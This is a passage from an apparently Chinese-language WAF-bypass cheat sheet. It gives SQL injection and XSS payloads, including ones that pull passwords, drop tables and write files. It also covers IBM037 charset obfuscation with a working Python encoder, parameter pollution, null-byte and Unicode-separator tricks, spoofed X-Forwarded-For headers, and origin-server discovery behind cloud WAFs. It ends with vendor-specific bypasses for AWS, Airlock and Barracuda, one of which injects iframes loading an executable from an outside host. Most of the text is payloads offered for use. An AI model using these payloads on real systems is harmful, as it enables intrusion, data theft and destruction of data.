<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Case: Unknown Token for the Tokenizer</span><br><span class="line"></span><br><span class="line">Payload: ?id=‘-sqlite_version() UNION SELECT password FROM users --</span><br><span class="line"></span><br><span class="line">Case: Unknown Context for the Parser (Notice the uncontexted bracket)</span><br><span class="line"></span><br><span class="line">Payload 1: ?id=123);DROP TABLE users --</span><br><span class="line"></span><br><span class="line">Payload 2: ?id=1337) INTO OUTFILE ‘xxx’ --</span><br></pre></td></tr></table></figure>



<blockquote>
<p><strong>TIP:</strong> 更多payload可以看这里 cheat sheet.</p>
</blockquote>
<p><strong>14. 其他格式混淆</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">许多web应用程序支持不同的编码类型(如下表)</span><br><span class="line"></span><br><span class="line">混淆成服务器可解析、waf不可解析的编码类型</span><br></pre></td></tr></table></figure>

<p><strong>Case:</strong> IIS</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IIS6, 7.5, 8 and 10 (ASPX v4.x) 允许 IBM037 字符</span><br><span class="line"></span><br><span class="line">可以发送编码后的参数名和值</span><br></pre></td></tr></table></figure>

<p>原始请求:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /sample.aspx?id1=something HTTP/1.1</span><br><span class="line">HOST: victim.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line">id2=&#x27;union all select * from users--</span><br></pre></td></tr></table></figure>



<p>混淆请求 + URL Encoding:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /sample.aspx?%89%84%F1=%A2%96%94%85%A3%88%89%95%87 HTTP/1.1</span><br><span class="line">HOST: victim.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=ibm037</span><br><span class="line">Content-Length: 115</span><br><span class="line"></span><br><span class="line">%89%84%F2=%7D%A4%95%89%96%95%40%81%93%93%40%A2%85%93%85%83%A3%40%5C%40%86%99%96%94%40%A4%A2%85%99%A2%60%60</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>TIP:</strong> 可以使用 这个小脚本 来转化编码</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse, sys</span><br><span class="line">from argparse import ArgumentParser</span><br><span class="line">lackofart = &#x27;&#x27;&#x27;</span><br><span class="line">        OBFUSCATOR</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def paramEncode(params=&quot;&quot;, charset=&quot;&quot;, encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line">    equalSign = &quot;=&quot;</span><br><span class="line">    ampersand = &quot;&amp;&quot;</span><br><span class="line">    if &#x27;=&#x27; and &#x27;&amp;&#x27; in params:</span><br><span class="line">        if encodeEqualSign:</span><br><span class="line">            equalSign = equalSign.encode(charset)</span><br><span class="line">        if encodeAmpersand:</span><br><span class="line">            ampersand = ampersand.encode(charset)</span><br><span class="line">        params_list = params.split(&quot;&amp;&quot;)</span><br><span class="line">        for param_pair in params_list:</span><br><span class="line">            param, value = param_pair.split(&quot;=&quot;)</span><br><span class="line">            if urlDecodeInput:</span><br><span class="line">                param = urllib.parse.unquote(param)</span><br><span class="line">                value = urllib.parse.unquote(value)</span><br><span class="line">            param = param.encode(charset)</span><br><span class="line">            value = value.encode(charset)</span><br><span class="line">            if urlEncodeOutput:</span><br><span class="line">                param = urllib.parse.quote_plus(param)</span><br><span class="line">                value = urllib.parse.quote_plus(value)</span><br><span class="line">            if result:</span><br><span class="line">                result += ampersand</span><br><span class="line">            result += param + equalSign + value</span><br><span class="line">    else:</span><br><span class="line">        if urlDecodeInput:</span><br><span class="line">            params = urllib.parse.unquote(params)</span><br><span class="line">        result = params.encode(charset)</span><br><span class="line">        if urlEncodeOutput:</span><br><span class="line">            result = urllib.parse.quote_plus(result)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(lackofart)</span><br><span class="line">    parser = ArgumentParser(&#x27;python3 obfu.py&#x27;)</span><br><span class="line">    parser._action_groups.pop()</span><br><span class="line"></span><br><span class="line">    # A simple hack to have required arguments and optional arguments separately</span><br><span class="line">    required = parser.add_argument_group(&#x27;Required Arguments&#x27;)</span><br><span class="line">    optional = parser.add_argument_group(&#x27;Optional Arguments&#x27;)</span><br><span class="line"></span><br><span class="line">    # Required Options</span><br><span class="line">    required.add_argument(&#x27;-s&#x27;, &#x27;--str&#x27;, help=&#x27;String to obfuscate&#x27;, dest=&#x27;str&#x27;)</span><br><span class="line">    required.add_argument(&#x27;-e&#x27;, &#x27;--enc&#x27;, help=&#x27;Encoding type. eg: ibm037, utf16, etc&#x27;, dest=&#x27;enc&#x27;)</span><br><span class="line"></span><br><span class="line">    # Optional Arguments (main stuff and necessary)</span><br><span class="line">    optional.add_argument(&#x27;-ueo&#x27;, help=&#x27;URL Encode Output&#x27;, dest=&#x27;ueo&#x27;, action=&#x27;store_true&#x27;)</span><br><span class="line">    optional.add_argument(&#x27;-udi&#x27;, help=&#x27;URL Decode Input&#x27;, dest=&#x27;udi&#x27;, action=&#x27;store_true&#x27;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    if not len(sys.argv) &gt; 1:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        quit()</span><br><span class="line">    print(&#x27;Input: %s&#x27; % (args.str))</span><br><span class="line">    print(&#x27;Output: %s&#x27; % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">服务器信息</th>
<th align="left">可用编码</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Nginx, uWSGI-Django-Python3</td>
<td align="left">IBM037, IBM500, cp875, IBM1026, IBM273</td>
<td align="left">对参数名和参数值进行编码 服务器会对参数名和参数值均进行url解码 需要对等号和&amp; and进行编码(不进行url编码)</td>
</tr>
<tr>
<td align="left">Nginx, uWSGI-Django-Python2</td>
<td align="left">IBM037, IBM500, cp875, IBM1026, utf-16, utf-32, utf-32BE, IBM424</td>
<td align="left">对参数名和参数值进行便慢慢 服务器会对参数名和参数值均进行url解码 等号和&amp;符号不应该以任何方式编码。</td>
</tr>
<tr>
<td align="left">Apache-TOMCAT8-JVM1.8-JSP</td>
<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td align="left">Apache-TOMCAT7-JVM1.6-JSP</td>
<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM297, IBM420, IBM424, IBM-Thai, IBM871, cp1025</td>
<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
<tr>
<td align="left">IIS6, 7.5, 8, 10 -ASPX (v4.x)</td>
<td align="left">IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047, IBM01140, IBM01141, IBM01142, IBM01143, IBM01144, IBM01145, IBM01146, IBM01147, IBM01148, IBM01149, utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273, IBM277, IBM278, IBM280, IBM284, IBM285, IBM290, IBM297, IBM420,IBM423, IBM424, x-EBCDIC-KoreanExtended, IBM-Thai, IBM871, IBM880, IBM905, IBM00924, cp1025</td>
<td align="left">参数名按原始格式(可以像往常一样使用url编码) Body 不论是否经过url编码均可 等号和&amp;符号不应该以任何方式编码</td>
</tr>
</tbody></table>
<h3 id="0X04-HTTP-参数污染"><a href="#0X04-HTTP-参数污染" class="headerlink" title="0X04    HTTP 参数污染"></a><strong>0X04    HTTP 参数污染</strong></h3><h4 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这种攻击方法基于服务器如何解释具有相同名称的参数</span><br><span class="line">可能造成bypass的情况:</span><br><span class="line">服务器使用最后接收到的参数，WAF只检查第一个参数</span><br><span class="line">服务器将来自类似参数的值联合起来，WAF单独检查它们</span><br></pre></td></tr></table></figure>

<p>下面是相关服务器对参数解释的比较</p>
<table>
<thead>
<tr>
<th align="left">环境</th>
<th align="left">参数解析</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ASP/IIS</td>
<td align="left">用逗号连接</td>
<td align="left">par1=val1,val2</td>
</tr>
<tr>
<td align="left">JSP, Servlet/Apache Tomcat</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">ASP.NET/IIS</td>
<td align="left">用逗号连接</td>
<td align="left">par1=val1,val2</td>
</tr>
<tr>
<td align="left">PHP/Zeus</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">PHP/Apache</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">JSP, Servlet/Jetty</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">IBM Lotus Domino</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">IBM HTTP Server</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">mod_perl, libapeq2/Apache</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">Oracle Application Server 10G</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">Perl CGI/Apache</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">Python/Zope</td>
<td align="left">第一个参数是结果</td>
<td align="left">par1=val1</td>
</tr>
<tr>
<td align="left">IceWarp</td>
<td align="left">返回一个列表</td>
<td align="left">[‘val1’,’val2’]</td>
</tr>
<tr>
<td align="left">AXIS 2400</td>
<td align="left">最后一个参数是结果</td>
<td align="left">par1=val2</td>
</tr>
<tr>
<td align="left">DBMan</td>
<td align="left">由两个波浪号连接起来</td>
<td align="left">par1=val1~~val2</td>
</tr>
<tr>
<td align="left">mod-wsgi (Python)/Apache</td>
<td align="left">返回一个列表</td>
<td align="left">ARRAY(0x8b9058c)</td>
</tr>
</tbody></table>
<h3 id="0X05-浏览器的缺陷"><a href="#0X05-浏览器的缺陷" class="headerlink" title="0X05    浏览器的缺陷"></a><strong>0X05    浏览器的缺陷</strong></h3><h4 id="Charset-Bugs"><a href="#Charset-Bugs" class="headerlink" title="Charset Bugs:"></a>Charset Bugs:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以尝试 修改 charset header to 更高的 Unicode (eg. UTF-32)</span><br><span class="line"></span><br><span class="line">当网站解码的时候，触发payload</span><br></pre></td></tr></table></figure>

<p>Example request:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /page.php?p=∀㸀㰀script㸀alert(1)㰀/script㸀 HTTP/1.1</span><br><span class="line">Host: site.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0</span><br><span class="line">Accept-Charset:utf-32; q=0.5&lt;</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>

<p>当站点加载时，将其编码为我们设置的UTF-32编码，然后由于页面的输出编码为UTF-8，将其呈现为:<code>&quot;alert (1) &lt;/ script&gt;</code> 从而触发xss</p>
<p>完整url编码后的 payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80</span><br></pre></td></tr></table></figure>

<h4 id="Null-空字节"><a href="#Null-空字节" class="headerlink" title="Null 空字节"></a>Null 空字节</h4><p>空字节通常用作字符串终止符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Payload 示例:</span><br><span class="line"></span><br><span class="line">&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;</span><br><span class="line">&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</span><br><span class="line">标准: &lt;a href=&quot;javascript:alert()&quot;&gt;</span><br><span class="line">混淆: &lt;a href=&quot;ja0x09vas0x0A0x0Dcript:alert(1)&quot;&gt;clickme&lt;/a&gt;</span><br><span class="line">变形: &lt;a 0x00 href=&quot;javascript:alert(1)&quot;&gt;clickme&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="解析错误"><a href="#解析错误" class="headerlink" title="解析错误"></a>解析错误</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">RFC 声明节点名不可以由空白起始</span><br><span class="line"></span><br><span class="line">但是我们可以使用特殊字符 ` %, //, !, ?`, etc.</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line"></span><br><span class="line">&lt;// style=x:expression\28write(1)\29&gt; - Works upto IE7 (Source)</span><br><span class="line"></span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; - Works upto IE9 (Reference)</span><br><span class="line"></span><br><span class="line">&lt;?xml-stylesheet type=&quot;text/css&quot;?&gt;&lt;root style=&quot;x:expression(write(1))&quot;/&gt; - Works in IE7 (Reference)</span><br><span class="line"></span><br><span class="line">&lt;%div%20style=xss:expression(prompt(1))&gt; - Works Upto IE7</span><br></pre></td></tr></table></figure>

<h4 id="Unicode-分隔符"><a href="#Unicode-分隔符" class="headerlink" title="Unicode 分隔符"></a>Unicode 分隔符</h4><ul>
<li>每个浏览器有不同的分隔分隔符</li>
</ul>
<p>@Masato Kinugawafuzz 后发现如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">IExplorer: 0x09, 0x0B, 0x0C, 0x20, 0x3B</span><br><span class="line"></span><br><span class="line">Chrome: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Safari: 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">FireFox: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Opera: 0x09, 0x20, 0x2C, 0x3B</span><br><span class="line"></span><br><span class="line">Android: 0x09, 0x20, 0x28, 0x2C, 0x3B</span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/onmouseover[\x0b]=location=&#x27;\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x30\x29\x3B&#x27;&gt;pwn3d</span><br></pre></td></tr></table></figure>

<h3 id="使用其他非典型等效语法结构替换"><a href="#使用其他非典型等效语法结构替换" class="headerlink" title="使用其他非典型等效语法结构替换"></a>使用其他非典型等效语法结构替换</h3><p>找的waf开发人员没有注意到的语句进行攻击</p>
<p>一些WAF开发人员忽略的常见关键字:</p>
<ul>
<li><p>JavaScript functions:</p>
</li>
<li><ul>
<li><code>window</code></li>
<li><code>parent</code></li>
<li><code>this</code></li>
<li><code>self</code></li>
</ul>
</li>
<li><p>Tag attributes:</p>
</li>
<li><ul>
<li><code>onwheel</code></li>
<li><code>ontoggle</code></li>
<li><code>onfilterchange</code></li>
<li><code>onbeforescriptexecute</code></li>
<li><code>ondragstart</code></li>
<li><code>onauxclick</code></li>
<li><code>onpointerover</code></li>
<li><code>srcdoc</code></li>
</ul>
</li>
</ul>
<p>SQL Operators</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lpad</span><br><span class="line">lpad( string, padded_length, [ pad_string ] ) lpad函数从左边对字符串使用指定的字符进行填充</span><br><span class="line">  lpad(&#x27;tech&#x27;, 7); 将返回&#x27; tech&#x27;</span><br><span class="line">  lpad(&#x27;tech&#x27;, 2); 将返回&#x27;te&#x27;</span><br><span class="line">  lpad(&#x27;tech&#x27;, 8, &#x27;0&#x27;); 将返回&#x27;0000tech&#x27;</span><br><span class="line">  lpad(&#x27;tech on the net&#x27;, 15, &#x27;z&#x27;); 将返回&#x27;tech on the net&#x27;</span><br><span class="line">  lpad(&#x27;tech on the net&#x27;, 16, &#x27;z&#x27;); 将返回&#x27;ztech on the net</span><br><span class="line">field</span><br><span class="line">FIELD(str,str1,str2,str3,...)</span><br><span class="line">返回的索引（从1开始的位置）的str在str1，str2，STR3，...列表中。如果str没有找到，则返回0。</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| FIELD(&#x27;ej&#x27;, &#x27;Hej&#x27;, &#x27;ej&#x27;, &#x27;Heja&#x27;, &#x27;hej&#x27;, &#x27;foo&#x27;) |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| 2                                                       |</span><br><span class="line">+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p><code>bit_count</code> 二进制数中包含1的个数。BIT_COUNT(10);因为10转成二进制是1010，所以该结果就是2</p>
<p>示例payloads:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Case: XSS</span><br><span class="line">&lt;script&gt;window[&#x27;alert&#x27;](0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;parent[&#x27;alert&#x27;](1)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;self[&#x27;alert&#x27;](2)&lt;/script&gt;</span><br><span class="line">Case: SQLi</span><br><span class="line">SELECT if(LPAD(&#x27; &#x27;,4,version())=&#x27;5.7&#x27;,sleep(5),null);</span><br><span class="line">1%0b||%0bLPAD(USER,7,1)</span><br><span class="line">可以使用许多替代原生JavaScript的方法:</span><br></pre></td></tr></table></figure>

<p>JSFuck</p>
<p>JJEncode</p>
<p>XChars.JS</p>
<h3 id="滥用SSL-TLS密码"><a href="#滥用SSL-TLS密码" class="headerlink" title="滥用SSL/TLS密码:"></a>滥用SSL/TLS密码:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">很多时候，服务器可以接收各种SSL/TLS密码和版本的连接。</span><br><span class="line">初始化到waf不支持的版本</span><br><span class="line">找出waf支持的密码(通常WAF供应商文档对此进行了讨论)。</span><br><span class="line">找出服务器支持的密码(SSLScan这种工具可以帮助到你)。</span><br><span class="line">找出服务器支持但waf不支持的</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Tool</strong>: abuse-ssl-bypass-waf</p>
</blockquote>
<h3 id="滥用-DNS-记录"><a href="#滥用-DNS-记录" class="headerlink" title="滥用 DNS 记录:"></a>滥用 DNS 记录:</h3><ul>
<li>找到云waf后的源站</li>
</ul>
<blockquote>
<p><strong>TIP:</strong> 一些在线资源 IP History 和 DNS Trails</p>
</blockquote>
<p><strong>Tool</strong>: bypass-firewalls-by-DNS-history</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash bypass-firewalls-by-DNS-history.sh -d &lt;target&gt; --checkall</span><br></pre></td></tr></table></figure>

<h3 id="请求头欺骗"><a href="#请求头欺骗" class="headerlink" title="请求头欺骗"></a>请求头欺骗</h3><p>让waf以为请求来自于内部网络，进而不对其进行过滤。</p>
<p>添加如下请求头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="Google-Dorks-Approach"><a href="#Google-Dorks-Approach" class="headerlink" title="Google Dorks Approach:"></a><strong>Google Dorks Approach:</strong></h3><p>应对已知WAF的绕过</p>
<h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法:"></a>搜索语法:</h4><h4 id="Normal-search"><a href="#Normal-search" class="headerlink" title="Normal search:"></a>Normal search:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ waf bypass</span><br></pre></td></tr></table></figure>

<p>Searching for specific version exploits:<br><code>&quot; &quot; (bypass|exploit)</code></p>
<p>For specific type bypass exploits:<br><code>&quot;&quot; + (bypass|exploit)</code></p>
<p>On Exploit DB:<br><code>site:exploit-db.com + bypass</code></p>
<p>On 0Day Inject0r DB:<br><code>site:0day.today +  (bypass|exploit)</code></p>
<p>On Twitter:<br><code>site:twitter.com + bypass</code></p>
<p>On Pastebin<br><code>site:pastebin.com + bypass</code></p>
<h2 id="0X06-拓展Bypass姿势"><a href="#0X06-拓展Bypass姿势" class="headerlink" title="0X06  拓展Bypass姿势"></a><strong>0X06  拓展Bypass姿势</strong></h2><h3 id="Airlock-Ergon"><a href="#Airlock-Ergon" class="headerlink" title="Airlock Ergon"></a><strong>Airlock Ergon</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQLi Overlong UTF-8 Sequence Bypass (&gt;= v4.2.4) by @Sec Consult</span><br><span class="line"></span><br><span class="line">%C0%80&#x27;+union+select+col1,col2,col3+from+table+--+</span><br></pre></td></tr></table></figure>



<p><strong>AWS</strong></p>
<p>SQLi Bypass by @enkaskal</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;; select * from TARGET_TABLE --</span><br><span class="line">XSS Bypass by @kmkz</span><br><span class="line">&lt;script&gt;eval(atob(decodeURIComponent(&quot;payload&quot;)))//</span><br></pre></td></tr></table></figure>

<h3 id="Barracuda"><a href="#Barracuda" class="headerlink" title="Barracuda"></a><strong>Barracuda</strong></h3><p>Cross Site Scripting by @WAFNinja</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style=&quot;height:1000px&quot; onwheel=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;div contextmenu=&quot;xss&quot;&gt;Right-Click Here&lt;menu id=&quot;xss&quot; onshow=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>HTML Injection by @Global-Evolution</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-mod/index.cgi?&amp;primary_tab=ADVANCED&amp;secondary_tab=test_backup_server&amp;content_only=1&amp;&amp;&amp;backup_port=21&amp;&amp;backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_type=ftp&amp;&amp;backup_life=5&amp;&amp;backup_server=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_path=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net/etc/bad-example.exe%3E&amp;&amp;backup_password=%3E%22%3Ciframe%20src%3Dhttp%3A//www.example.net%20width%3D800%20height%3D800%3E&amp;&amp;user=guest&amp;&amp;password=121c34d4e85dfe6758f31ce2d7b763e7&amp;&amp;et=1261217792&amp;&amp;locale=en_US</span><br><span class="line">Host: favoritewaf.com</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)</span><br></pre></td></tr></table></figure>

<p>XSS Bypass by @0xInfection</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()&gt;clickhere</span><br><span class="line">Barracuda WAF 8.0.1 - Remote Command Execution (Metasploit) by @xort</span><br></pre></td></tr></table></figure>

<p>Barracuda Spam &amp; Virus Firewall 5.1.3 - Remote Command Execution (Metasploit) by @xort</p>
<h3 id="Cerber-WordPress"><a href="#Cerber-WordPress" class="headerlink" title="Cerber (WordPress)"></a><strong>Cerber (WordPress)</strong></h3><p>Username Enumeration Protection Bypass by HTTP Verb Tampering by @ed0x21son</p>
